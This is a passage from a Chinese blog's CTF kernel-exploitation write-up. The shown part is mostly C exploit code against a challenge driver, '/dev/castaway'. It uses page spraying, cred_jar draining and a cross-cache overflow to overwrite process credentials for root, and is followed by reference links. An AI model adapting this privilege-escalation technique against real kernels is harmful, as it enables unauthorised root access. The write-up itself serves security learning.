<span class="hljs-built_in">sizeof</span>(req));<br>    <span class="hljs-comment">/* read from parent pipe which just been writen by child manager */</span><br>    <span class="hljs-built_in">read</span>(sprayfd_parent[<span class="hljs-number">0</span>], &amp;result, <span class="hljs-built_in">sizeof</span>(result));<br>    <span class="hljs-built_in">assert</span>(result == idx);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">alloc_vuln_page</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, full_page *arr, <span class="hljs-type">int</span> page_idx)</span></span>&#123;<br>    <span class="hljs-built_in">assert</span>(!arr[page_idx].in_use);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; ISO_SLAB_LIMIT; i++)&#123;<br>        <span class="hljs-type">long</span> result = <span class="hljs-built_in">alloc</span>(fd);<br>        <span class="hljs-keyword">if</span>(result &lt; <span class="hljs-number">0</span>)&#123;<br>            <span class="hljs-built_in">error_log</span>(<span class="hljs-string">&quot;Allocation vuln page error...&quot;</span>);<br>        &#125;<br>        arr[page_idx].idx[i] = result;<br>    &#125;<br>    arr[page_idx].in_use = <span class="hljs-literal">true</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">edit_vuln_page</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, full_page *arr, <span class="hljs-type">int</span> page_idx, <span class="hljs-type">uint8_t</span> *buf, <span class="hljs-type">size_t</span> sz)</span></span>&#123;<br>    <span class="hljs-built_in">assert</span>(arr[page_idx].in_use);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; ISO_SLAB_LIMIT; i++)&#123;<br>        <span class="hljs-type">long</span> result = <span class="hljs-built_in">edit</span>(fd, arr[page_idx].idx[i], sz, buf);<br>        <span class="hljs-keyword">if</span>(result &lt; <span class="hljs-number">0</span>)&#123;<br>            <span class="hljs-built_in">error_log</span>(<span class="hljs-string">&quot;edit error...&quot;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv)</span></span>&#123;<br><br>    <span class="hljs-built_in">info_log</span>(<span class="hljs-string">&quot;Step I: Open the vulnurability driver...&quot;</span>);<br>    <span class="hljs-type">int</span> fd = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/dev/castaway&quot;</span>, O_RDONLY);<br>    <span class="hljs-keyword">if</span>(fd &lt; <span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-built_in">error_log</span>(<span class="hljs-string">&quot;Driver open failed!&quot;</span>);<br>    &#125;<br>    <br>    <span class="hljs-built_in">info_log</span>(<span class="hljs-string">&quot;Step II: Construct two pipe for communicating in those namespace...&quot;</span>);<br>    <span class="hljs-built_in">pipe</span>(sprayfd_child);<br>    <span class="hljs-built_in">pipe</span>(sprayfd_parent);<br><br>    <span class="hljs-built_in">info_log</span>(<span class="hljs-string">&quot;Step III: Setting up spray manager in separate namespace...&quot;</span>);<br>    <span class="hljs-keyword">if</span>(!fork())&#123;<br>        <span class="hljs-built_in">unshare_setup</span>(<span class="hljs-built_in">getuid</span>(), <span class="hljs-built_in">getgid</span>());<br>        <span class="hljs-built_in">spray_comm_handler</span>();<br>    &#125;<br>    <span class="hljs-comment">/* For communicating with the fork later */</span><br>    <span class="hljs-built_in">pipe</span>(rootfd);<br>    <span class="hljs-type">char</span> evil[CHUNK_SIZE];<br>    <span class="hljs-built_in">memset</span>(evil, <span class="hljs-number">0</span>, <span class="hljs-built_in">sizeof</span>(evil));<br>    <br>    <span class="hljs-built_in">info_log</span>(<span class="hljs-string">&quot;Step IV: Draining Start!&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*]draining cred_jar...&quot;</span>);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; CRED_JAR_INITIAL_SPRAY; i++)&#123;<br>        <span class="hljs-type">pid_t</span> result = fork();<br>        <span class="hljs-keyword">if</span>(!result)&#123;<br>            <span class="hljs-built_in">just_wait</span>();<br>        &#125;<br>        <span class="hljs-keyword">if</span>(result &lt; <span class="hljs-number">0</span>)&#123;<br>            <span class="hljs-built_in">error_log</span>(<span class="hljs-string">&quot;fork limit...&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*]draining Buddysystem, of course order 0 :)&quot;</span>);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; INITIAL_PAGE_SPRAY; i++)&#123;<br>        <span class="hljs-built_in">send_spray_cmd</span>(ALLOC_PAGE, i);<br>    &#125;<br>    <span class="hljs-comment">/* Free the medium one, of many in other words... */</span><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt; INITIAL_PAGE_SPRAY; i += <span class="hljs-number">2</span>)&#123;<br>        <span class="hljs-built_in">send_spray_cmd</span>(FREE_PAGE, i);<br>    &#125; <br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; FORK_SPRAY; i++)&#123;<br>        <span class="hljs-type">pid_t</span> result = __clone(CLONE_FLAGS, &amp;check_and_wait);<br>        <span class="hljs-keyword">if</span>(result &lt; <span class="hljs-number">0</span>)&#123;<br>            <span class="hljs-built_in">error_log</span>(<span class="hljs-string">&quot;clone error...&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; INITIAL_PAGE_SPRAY; i += <span class="hljs-number">2</span>)&#123;<br>        <span class="hljs-built_in">send_spray_cmd</span>(FREE_PAGE, i);<br>    &#125; <br> <br>    *(<span class="hljs-type">uint32_t</span> *)&amp;evil[CHUNK_SIZE - <span class="hljs-number">0x6</span>] = <span class="hljs-number">1</span>;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*]Spraying cross cache overflow...&quot;</span>);   <br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; FINAL_PAGE_SPRAY; i++)&#123;<br>        <span class="hljs-built_in">alloc_vuln_page</span>(fd, isolation_pages, i);<br>        <span class="hljs-built_in">edit_vuln_page</span>(fd, isolation_pages, i, evil, CHUNK_SIZE);<br>    &#125;<br>    <span class="hljs-built_in">write</span>(rootfd[<span class="hljs-number">1</span>], evil, FORK_SPRAY);<br>    <span class="hljs-built_in">sleep</span>(<span class="hljs-number">10000</span>);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br><br></code></pre></td></tr></table></figure>



<h1 id="极、参考链接"><a href="#极、参考链接" class="headerlink" title="极、参考链接"></a>极、参考链接</h1><blockquote>
<p><a target="_blank" rel="noopener" href="https://arttnba3.cn/">https://arttnba3.cn/</a></p>
</blockquote>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://blingblingxuanxuan.github.io/">https://blingblingxuanxuan.github.io/</a></p>
</blockquote>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://kiprey.gitee.io/2021/10/kernel_pwn_introduction/#3-tty-struct-%E7%BB%93%E6%9E%84%E7%9A%84%E5%88%A9%E7%94%A8">https://kiprey.gitee.io/2021/10/kernel_pwn_introduction&#x2F;</a></p>
</blockquote>
<blockquote>
<p><a target="_blank" rel="noopener" href="http://blog.jcix.top/2018-10-01/userfaultfd_intro/">http://blog.jcix.top/2018-10-01/userfaultfd_intro&#x2F;</a></p>
</blockquote>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://www.willsroot.io/">https://www.willsroot.io/</a></p>
</blockquote>

                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
    <div class="post-meta mr-3 d-flex align-items-center">
      <i class="iconfont icon-category"></i>
      

<span class="category-chains">
  
  
    
      <span class="category-chain">
        
  <a href="/categories/Linux-Kernel/" class="category-chain-item">Linux Kernel</a>
  
  

      </span>
    
  
</span>

    </div>
  
  
    <div class="post-meta">
      <i class="iconfont icon-tags"></i>
      
        <a href="/tags/pwn/">#pwn</a>
      
        <a href="/tags/kernel/">#kernel</a>
      
        <a href="/tags/ctf/">#ctf</a>
      
    </div>
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>Linux-Kernel-0x02-Practice</div>
      <div>https://peiandhao.github.io/2023/06/24/Linux-Kernel-0x02-Practice/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>作者</div>
          <div>peiwithhao</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>发布于</div>
          <div>2023年6月24日</div>
        </div>
      
      
      
        <div class="license-meta-item">
          <div>许可协议</div>
          <div>
            
              
              
                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
                    <i class="iconfont icon-by"></i>
                  </span>
                </a>
              
            
          </div>
        </div>
      
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2023/07/18/Linux-Kernel-SLUB%E5%88%86%E9%85%8D%E5%99%A8/" title="Linux_Kernel_SLUB分配器">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">Linux_Kernel_SLUB分配器</span>
                        <span class="visible-mobile">上一篇</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2023/06/22/KVM-Qemu/" title="KVM_Qemu">
                        <span class="hidden-mobile">KVM_Qemu</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
  
  
    <article id="comments" lazyload>
      
  <div id="valine"></div>
  <script type="text/javascript">
    Fluid.utils.loadComments('#valine', function() {
      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.5.1/Valine.min.js', function() {
        var options = Object.assign(
          {"appId":"Afm6UeM0VL6RfMOLAgwtyxs8-gzGzoHsz","appKey":"Vr60qrZIptqhJaXqWvDEknkH","path":"window.location.pathname","placeholder":"锐评一下","avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":false},
          {
            el: "#valine",
            path: window.location.pathname
          }
        )
        new Valine(options);
        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
          var imgSelector = '#valine .vcontent img:not(.vemoji)';
          Fluid.plugins.imageCaption(imgSelector);
          Fluid.plugins.fancyBox(imgSelector);
        })
      });
    });
  </script>
  <noscript>Please enable JavaScript to view the comments</noscript>


    </article>
  


          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header">
    <i class="iconfont icon-list"></i>
    <span>目录</span>
  </p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  







    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
       <div> <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Pei</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Hao</span></a> <span id="timeDate">载入天数...</span> <span id="times">载入时分秒...</span> <script src="/js/duration.js"></script> </div> 
    </div>
  
  
    <div class="statistics">
  
  

  
    
      <span id="leancloud-site-pv-container" style="display: none">
        总访问量 
        <span id="leancloud-site-pv"></span>
         次
      </span>
    
    
      <span id="leancloud-site-uv-container" style="display: none">
        总访客数 
        <span id="leancloud-site-uv"></span>
         人
      </span>
    
    

  
</div>

  
  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init(Object.assign({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      scrollSmooth    : true,
      includeTitleTags: true,
      headingsOffset  : -boardTop,
    }, CONFIG.toc));
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }

    Fluid.events.registerRefreshCallback(function() {
      if ('tocbot' in window) {
        tocbot.refresh();
        var toc = jQuery('#toc');
        if (toc.length === 0 || !tocbot) {
          return;
        }
        if (toc.find('.toc-list-item').length > 0) {
          toc.css('visibility', 'visible');
        }
      }
    });
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));

    Fluid.events.registerRefreshCallback(function() {
      if ('anchors' in window) {
        anchors.removeAll();
        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
        var res = [];
        for (var item of el) {
          res.push('.markdown-body > ' + item.trim());
        }
        if (CONFIG.anchorjs.placement === 'left') {
          anchors.options.class = 'anchorjs-link-left';
        }
        anchors.add(res.join(', '));
      }
    });
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  <script defer src="/js/leancloud.js" ></script>

  <script  src="/js/local-search.js" ></script>




  
<script src="/js/DynamicLine.js"></script>



<!-- 主题的启动项，将它保持在最底部 -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
  </noscript>
</body>
</html>
